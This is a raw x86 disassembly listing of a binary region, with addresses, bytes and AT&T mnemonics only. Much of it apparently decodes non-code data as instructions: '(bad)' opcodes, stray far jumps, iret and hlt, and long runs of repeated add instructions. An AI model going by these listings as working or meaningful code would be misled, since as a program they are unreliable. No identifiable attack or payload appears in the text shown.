  406f91:	00 89 02 71 0e 6b    	add    %cl,0x6b0e7102(%ecx)
  406f97:	01 b1 02 5b 0e 47    	add    %esi,0x470e5b02(%ecx)
  406f9d:	02 a1 02 9a 19 c7    	add    -0x38e665fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 11                	add    %edx,(%ecx)
  406fa7:	21 1a                	and    %ebx,(%edx)
  406fa9:	05 89 02 c9 20       	add    $0x20c90289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 38                	add    (%eax),%bh
  406fb3:	0e                   	push   %cs
  406fb4:	20 05 89 02 af 24    	and    %al,0x24af0289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 f7 22 27    	add    0x2722f702(%ecx),%al
  406fc1:	05 c1 02 7c 1d       	add    $0x1d7c02c1,%eax
  406fc6:	30 05 c9 02 ab 0f    	xor    %al,0xfab02c9
  406fcc:	c7 00 91 02 df 25    	movl   $0x25df0291,(%eax)
  406fd2:	35 05 c1 01 11       	xor    $0x1101c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 cc 11       	add    $0x11cc0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 e4 20       	add    $0x20e402d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	f1                   	int1
  406fe9:	0f 3e                	(bad)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 19                	add    (%ecx),%bl
  406fef:	1e                   	push   %ds
  406ff0:	4c                   	dec    %esp
  406ff1:	05 d9 02 6a 1f       	add    $0x1f6a02d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 7e 0e c3       	mov    0xc30e7e02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 11                	add    %edx,(%ecx)
  407001:	21 01                	and    %eax,(%ecx)
  407003:	05 99 02 19 1e       	add    $0x1e190299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 0c 0f             	add    (%edi,%ecx,1),%cl
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 08                	add    (%eax),%cl
  407013:	15 c3 00 a1 02       	adc    $0x2a100c3,%eax
  407018:	8e 0e                	mov    (%esi),%cs
  40701a:	c7 00 89 02 5a 14    	movl   $0x145a0289,(%eax)
  407020:	4b                   	dec    %ebx
  407021:	02 89 02 90 11 4b    	add    0x4b119002(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	14 23                	adc    $0x23,%al
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	67 26 c3             	addr16 es ret
  407033:	00 a1 02 d8 22 c7    	add    %ah,-0x38dd27fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 19                	add    (%ecx),%bl
  40703d:	1e                   	push   %ds
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 11                	add    (%ecx),%dl
  407043:	12 23                	adc    (%ebx),%ah
  407045:	02 01                	add    (%ecx),%al
  407047:	03 19                	add    (%ecx),%ebx
  407049:	1e                   	push   %ds
  40704a:	0e                   	push   %cs
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 aa 0e 47 02 c1    	add    -0x3efdb8f2(%edx),%ebp
  407053:	01 b3 1d 47 02 c1    	add    %esi,-0x3efdb8e3(%ebx)
  407059:	01 22                	add    %esp,(%edx)
  40705b:	20 42 02             	and    %al,0x2(%edx)
  40705e:	09 03                	or     %eax,(%ebx)
  407060:	19 1e                	sbb    %ebx,(%esi)
  407062:	6b 01 09             	imul   $0x9,(%ecx),%eax
  407065:	03 61 21             	add    0x21(%ecx),%esp
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	01 1e                	add    %ebx,(%esi)
  40706e:	70 05                	jo     0x407075
  407070:	19 03                	sbb    %eax,(%ebx)
  407072:	76 22                	jbe    0x407096
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	6b 18 7c             	imul   $0x7c,(%eax),%ebx
  40707b:	05 c1 01 d1 21       	add    $0x21d101c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 43 23             	add    0x23(%ebx),%eax
  407086:	bf 01 81 02 94       	mov    $0x94028101,%edi
  40708b:	0d 86 05 29 03       	or     $0x3290586,%eax
  407090:	44                   	inc    %esp
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	c5 22                	lds    (%edx),%esp
  407098:	7b 00                	jnp    0x40709a
  40709a:	59                   	pop    %ecx
  40709b:	01 c6                	add    %eax,%esi
  40709d:	0e                   	push   %cs
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	9a 0e c3 00 59 01 b6 	lcall  $0xb601,$0x5900c30e
  4070a9:	19 93 05 c1 01 11    	sbb    %edx,0x1101c105(%ebx)
  4070af:	21 99 05 49 03 19    	and    %ebx,0x19034905(%ecx)
  4070b5:	1e                   	push   %ds
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	2c 03                	sub    $0x3,%al
  4070bc:	cd 03                	int    $0x3
  4070be:	51                   	push   %ecx
  4070bf:	03 d8                	add    %eax,%ebx
  4070c1:	14 75                	adc    $0x75,%al
  4070c3:	01 69 00             	add    %ebp,0x0(%ecx)
  4070c6:	19 1e                	sbb    %ebx,(%esi)
  4070c8:	0e                   	push   %cs
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 f2                	add    %dl,%dh
  4070cd:	13 70 01             	adc    0x1(%eax),%esi
  4070d0:	69 00 8b 0c aa 05    	imul   $0x5aa0c8b,(%eax),%eax
  4070d6:	c1 01 1f             	roll   $0x1f,(%ecx)
  4070d9:	14 b0                	adc    $0xb0,%al
  4070db:	05 c1 01 74 1d       	add    $0x1d7401c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 c3                	add    %eax,%ebx
  4070e5:	0c bd                	or     $0xbd,%al
  4070e7:	05 59 01 74 18       	add    $0x18740159,%eax
  4070ec:	1d 00 61 03 f2       	sbb    $0xf2036100,%eax
  4070f1:	13 47 02             	adc    0x2(%edi),%eax
  4070f4:	69 03 f5 14 c3 00    	imul   $0xc314f5,(%ebx),%eax
  4070fa:	b1 02                	mov    $0x2,%cl
  4070fc:	ea 0e c3 05 59 03 fc 	ljmp   $0xfc03,$0x5905c30e
  407103:	0e                   	push   %cs
  407104:	c3                   	ret
  407105:	05 59 03 f2 13       	add    $0x13f20359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	82 22 c9             	andb   $0xc9,(%edx)
  407111:	05 79 03 19 1e       	add    $0x1e190379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 ff 0d       	add    $0xdff0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 97 0f       	add    $0xf9700c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 97 0f 0e 00 09    	add    %dl,0x9000e0f(%edi)
  40712b:	03 19                	add    (%ecx),%ebx
  40712d:	1e                   	push   %ds
  40712e:	36 02 0c 00          	add    %ss:(%eax,%eax,1),%cl
  407132:	19 1e                	sbb    %ebx,(%esi)
  407134:	0e                   	push   %cs
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	20 0b                	and    %cl,(%ebx)
  40713a:	f5                   	cmc
  40713b:	05 0c 00 bb 22       	add    $0x22bb000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	ae                   	scas   %es:(%edi),%al
  407145:	25 fb 05 c1 01       	and    $0x1c105fb,%eax
  40714a:	95                   	xchg   %eax,%ebp
  40714b:	19 01                	sbb    %eax,(%ecx)
  40714d:	06                   	push   %es
  40714e:	51                   	push   %ecx
  40714f:	00 51 20             	add    %dl,0x20(%ecx)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 a9 01 17 06 59    	add    %ch,0x59061701(%ecx)
  40715b:	00 60 0b             	add    %ah,0xb(%eax)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	9e                   	sahf
  407163:	26 1d 06 69 00 19    	es sbb $0x19006906,%eax
  407169:	1e                   	push   %ds
  40716a:	01 03                	add    %eax,(%ebx)
  40716c:	61                   	popa
  40716d:	00 19                	add    %bl,(%ecx)
  40716f:	1e                   	push   %ds
  407170:	2d 06 91 03 97       	sub    $0x97039106,%eax
  407175:	0f 0e                	femms
  407177:	00 99 03 19 1e 56    	add    %bl,0x561e1903(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 73 13             	add    0x13(%ebx),%esi
  407182:	35 06 81 02 09       	xor    $0x9028106,%eax
  407187:	0d 0a 00 91 02       	or     $0x291000a,%eax
  40718c:	d2 25 35 05 91 02    	shlb   %cl,0x2910535
  407192:	cc                   	int3
  407193:	11 43 06             	adc    %eax,0x6(%ebx)
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	60                   	pusha
  407199:	0d 47 02 91 02       	or     $0x2910247,%eax
  40719e:	d2 25 54 06 91 02    	shlb   %cl,0x2910654
  4071a4:	c3                   	ret
  4071a5:	11 7c 05 91          	adc    %edi,-0x6f(%ebp,%eax,1)
  4071a9:	02 b7 11 6b 01 91    	add    -0x6efe94ef(%edi),%dh
  4071af:	02 df                	add    %bh,%bl
  4071b1:	25 5e 06 91 02       	and    $0x291065e,%eax
  4071b6:	4f                   	dec    %edi
  4071b7:	0d 6b 01 1c 00       	or     $0x1c016b,%eax
  4071bc:	20 0b                	and    %cl,(%ebx)
  4071be:	f5                   	cmc
  4071bf:	05 b9 03 1d 23       	add    $0x231d03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	01 1e                	add    %ebx,(%esi)
  4071ca:	92                   	xchg   %eax,%edx
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	76 22                	jbe    0x4071f2
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	fc                   	cld
  4071d5:	11 a9 06 24 00 43    	adc    %ebp,0x43002406(%ecx)
  4071db:	23 bf 01 c9 03 83    	and    -0x7cfc36ff(%edi),%edi
  4071e1:	19 b3 06 c9 03 1b    	sbb    %esi,0x1b03c906(%ebx)
  4071e7:	0b b9 06 d1 03 57    	or     0x5703d106(%ecx),%edi
  4071ed:	0f c1 06             	xadd   %eax,(%esi)
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	cb                   	lret
  4071f3:	0c c8                	or     $0xc8,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	d4 0d                	aam    $0xd
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 d2                	add    %edx,%edx
  4071ff:	0f d8 06             	psubusb (%esi),%mm0
  407202:	01 04 75 1c e2 06 2c 	add    %eax,0x2c06e21c(,%esi,2)
  407209:	00 d2                	add    %dl,%dl
  40720b:	0f 17 07             	movhps %xmm0,(%edi)
  40720e:	2c 00                	sub    $0x0,%al
  407210:	70 21                	jo     0x407233
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	6c                   	insb   (%dx),%es:(%edi)
  407217:	0d 3b 07 1c 00       	or     $0x1c073b,%eax
  40721c:	19 1e                	sbb    %ebx,(%esi)
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 dc                	add    %ebx,%esp
  407223:	26 84 00             	test   %al,%es:(%eax)
  407226:	21 04 19             	and    %eax,(%ecx,%ebx,1)
  407229:	1e                   	push   %ds
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 19                	add    $0x19,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 77             	sub    %eax,(%edi,%esi,2)
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 d4                	add    %edx,%esp
  40723b:	13 93 01 49 04 19    	adc    0x19044901(%ebx),%edx
  407241:	1e                   	push   %ds
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 19                	add    (%ecx),%bl
  407247:	1e                   	push   %ds
  407248:	0e                   	push   %cs
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 19                	add    $0x19,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	66 12 01             	data16 adc (%ecx),%al
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	03 12                	add    (%edx),%edx
  40725a:	01 03                	add    %eax,(%ebx)
  40725c:	51                   	push   %ecx
  40725d:	04 eb                	add    $0xeb,%al
  40725f:	0c 7a                	or     $0x7a,%al
  407261:	07                   	pop    %es
  407262:	51                   	push   %ecx
  407263:	04 67                	add    $0x67,%al
  407265:	13 81 07 51 04 ca    	adc    -0x35fbaef9(%ecx),%eax
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	bc 07 0e 00 51       	mov    $0x51000e07,%esp
  407275:	04 3e                	add    $0x3e,%al
  407277:	1e                   	push   %ds
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 19             	cmp    %eax,(%ecx,%ebx,1)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 9e                	add    $0x9e,%al
  407283:	07                   	pop    %es
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 7a             	cmp    %eax,(%edx,%edi,2)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	19 1e                	sbb    %ebx,(%esi)
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 ae 25 31 02 51    	add    0x51023125(%esi),%ch
  407299:	03 d8                	add    %eax,%ebx
  40729b:	14 9a                	adc    $0x9a,%al
  40729d:	07                   	pop    %es
  40729e:	79 04                	jns    0x4072a4
  4072a0:	19 1e                	sbb    %ebx,(%esi)
  4072a2:	6b 01 51             	imul   $0x51,(%ecx),%eax
  4072a5:	04 a5                	add    $0xa5,%al
  4072a7:	07                   	pop    %es
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 2e                	add    $0x2e,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 14             	roll   $0x14,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	54                   	push   %esp
  4072b9:	26 be 07 91 04 9e    	es mov $0x9e049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	19 1e                	sbb    %ebx,(%esi)
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 1d 21 f9 07 49    	add    %ebx,0x4907f921
  4072cf:	02 77 1f             	add    0x1f(%edi),%dh
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	77 1f                	ja     0x4072f7
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 19 1e 0e    	add    %ebp,0xe1e1900(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	6b 18 06             	imul   $0x6,(%eax),%ebx
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	bb 22 f4 01 1c       	mov    $0x1c01f422,%ebx
  4072ed:	00 5c 1c 0e          	add    %bl,0xe(%esp,%ebx,1)
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 f5                	add    %esi,%ebp
  4072f5:	1f                   	pop    %ds
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 ad 11 28 08 49    	add    %ch,0x49082811(%ebp)
  4072ff:	02 77 1f             	add    0x1f(%edi),%dh
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	65 00 32             	add    %dh,%gs:(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 c4                	add    %eax,%esp
  40730d:	18 47 02             	sbb    %al,0x2(%edi)
  407310:	a9 04 a5 0f 37       	test   $0x370fa504,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	65 00 3c 08          	add    %bh,%gs:(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 65 00             	add    %esp,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	65 00 46 08          	add    %al,%gs:0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 6e 00             	add    %ebp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407331:	0f 52 08             	rsqrtps (%eax),%xmm1
  407334:	51                   	push   %ecx
  407335:	01 6e 00             	add    %ebp,0x0(%esi)
  407338:	57                   	push   %edi
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	6e                   	outsb  %ds:(%esi),(%dx)
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 6e 00             	add    %ebp,0x0(%esi)
  407344:	61                   	popa
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	8b 0d 68 08 b1 04    	mov    0x4b10868,%ecx
  40734e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40734f:	0f 6d                	(bad)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	77 1f                	ja     0x407375
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 5e 26             	add    0x26(%esi),%ebx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	19 1e                	sbb    %ebx,(%esi)
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 a4             	roll   $0xa4,(%eax)
  407367:	11 f4                	adc    %esi,%esp
  407369:	01 89 01 19 1e 6b    	add    %ecx,0x6b1e1901(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	76 00                	jbe    0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 f1                	add    %cl,%dh
  407379:	0d bd 08 49 02       	or     $0x24908bd,%eax
  40737e:	8b 0d c4 08 49 02    	mov    0x24908c4,%ecx
  407384:	3b 00                	cmp    (%eax),%eax
  407386:	cb                   	lret
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	65 00 d2             	gs add %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	7f 00                	jg     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 6e 00             	add    0x0(%esi),%ch
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 77 1f             	add    0x1f(%edi),%dh
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 19             	roll   $1,(%ecx,%ebx,1)
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 c6                	add    %al,%dh
  4075bd:	12 9f 00 00 00 08    	adc    0x8000000(%edi),%bl
  4075c3:	13 a4 00 00 00 24 0a 	adc    0xa240000(%eax,%eax,1),%esp
  4075ca:	a9 00 00 00 0e       	test   $0xe000000,%eax
  4075cf:	05 ae 00 00 00       	add    $0xae,%eax
  4075d4:	e4 05                	in     $0x5,%al
  4075d6:	ae                   	scas   %es:(%edi),%al
  4075d7:	00 00                	add    %al,(%eax)
  4075d9:	00 f5                	add    %dh,%ch
  4075db:	1b b2 00 00 00 c4    	sbb    -0x3c000000(%edx),%esi
  4075e1:	1a b7 00 00 00 0f    	sbb    0xf000000(%edi),%dh
  4075e7:	25 bb 00 00 00       	and    $0xbb,%eax
  4075ec:	b5 15                	mov    $0x15,%ch
  4075ee:	b2 00                	mov    $0x0,%dl
  4075f0:	00 00                	add    %al,(%eax)
  4075f2:	53                   	push   %ebx
  4075f3:	03 bf 00 00 00 6d    	add    0x6d000000(%edi),%edi
  4075f9:	08 b7 00 00 00 c2    	or     %dh,-0x3e000000(%edi)
  4075ff:	02 c3                	add    %bl,%al
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 05 09 f8 01 00    	add    %al,0x1f809
  407609:	00 cd                	add    %cl,%ch
  40760b:	03 fe                	add    %esi,%edi
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 ab 09 69 02 00    	add    %ch,0x26909(%ebx)
  407615:	00 d9                	add    %bl,%cl
